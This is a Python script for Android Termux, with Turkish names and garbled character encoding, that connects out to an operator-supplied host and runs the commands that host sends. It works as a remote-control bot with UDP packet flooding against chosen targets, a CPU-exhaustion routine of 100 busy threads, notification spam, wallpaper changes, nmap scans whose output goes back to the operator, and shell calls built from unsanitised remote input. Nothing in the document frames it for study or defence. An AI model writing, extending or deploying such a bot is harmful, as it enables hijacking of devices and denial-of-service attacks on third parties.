
import socket
import os
import time
import threading

def bildirim_gonder(baslik, icerik):
    os.system(f'termux-notification --title "{baslik}" --content "{icerik}"')

def udp_yolla(ip, port, mesaj):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(100):
            sock.sendto(mesaj.encode(), (ip, int(port)))
        return "[âœ“] UDP paketleri gÃ¶nderildi."
    except Exception as e:
        return f"[X] UDP hatasÄ±: {str(e)}"

def arka_plan_degistir(dosya_adi):
    tam_yol = f"/sdcard/Download/{dosya_adi}"
    if os.path.exists(tam_yol):
        os.system(f"termux-wallpaper -f {tam_yol}")
        os.system('termux-toast -b green "Duvar kaÄŸÄ±dÄ± ayarlandÄ±"')
    else:
        os.system('termux-toast -b red "Dosya bulunamadÄ±"')

def yuk_bindir():
    def yÃ¼k():
        while True:
            pass
    for _ in range(100):
        threading.Thread(target=yÃ¼k, daemon=True).start()

def nmap_tara(ip):
    try:
        sonuc = os.popen(f"nmap {ip}").read()
        return sonuc
    except Exception as e:
        return f"[X] Nmap hatasÄ±: {str(e)}"

def google_ara(aranacak):
    try:
        url = f"https://www.google.com/search?q={aranacak.replace(' ', '+')}"
        os.system(f'am start -a android.intent.action.VIEW -d "{url}"')
        return "[âœ“] Google aramasÄ± aÃ§Ä±ldÄ±."
    except:
        return "[X] Google aÃ§Ä±lamadÄ±."

host = input("Sunucu IP >> ")
port = int(input("Port >> "))

s = socket.socket()
s.connect((host, port))
print(f"[+] BaÄŸlandÄ±: {host}:{port}")

while True:
    try:
        komut = s.recv(1024).decode().strip()
        if komut == "exit":
            break
        elif komut.startswith("bildirim-spam "):
            try:
                parcalar = komut.split('"')
                baslik = parcalar[1]
                icerik = parcalar[3]
                bildirim_gonder(baslik, icerik)
                s.send("[âœ“] Bildirim gÃ¶nderildi.".encode())
            except:
                s.send("[X] HatalÄ± bildirim komutu. Ã–rnek: bildirim-spam \"BaÅŸlÄ±k\" \"Ä°Ã§erik\"".encode())
        elif komut.startswith("udp-spam "):
            try:
                parcalar = komut.split(" ")
                hedef_ip = parcalar[1]
                hedef_port = parcalar[2]
                mesaj = " ".join(parcalar[3:])
                sonuc = udp_yolla(hedef_ip, hedef_port, mesaj)
                s.send(sonuc.encode())
            except:
                s.send("[X] HatalÄ± UDP komutu. Ã–rnek: udp-spam 192.168.1.5 80 mesaj".encode())
        elif komut.startswith("arka-plan "):
            dosya_adi = komut.split(" ", 1)[1]
            arka_plan_degistir(dosya_adi)
            s.send("[âœ“] Duvar kaÄŸÄ±dÄ± deÄŸiÅŸtirildi.".encode())
        elif komut == "yÃ¼kle":
            yuk_bindir()
            s.send("[âœ“] YÃ¼kleme baÅŸlatÄ±ldÄ±.".encode())
        elif komut.startswith("nmap "):
            hedef_ip = komut.split(" ", 1)[1]
            sonuc = nmap_tara(hedef_ip)
            s.send(sonuc.encode())
        elif komut.startswith("google "):
            arama = komut.split(" ", 1)[1]
            sonuc = google_ara(arama)
            s.send(sonuc.encode())
        else:
            s.send("[X] Bilinmeyen komut.".encode())
    except Exception as e:
        os.system(f'termux-toast -b red "{str(e)}"')
        break

s.close()
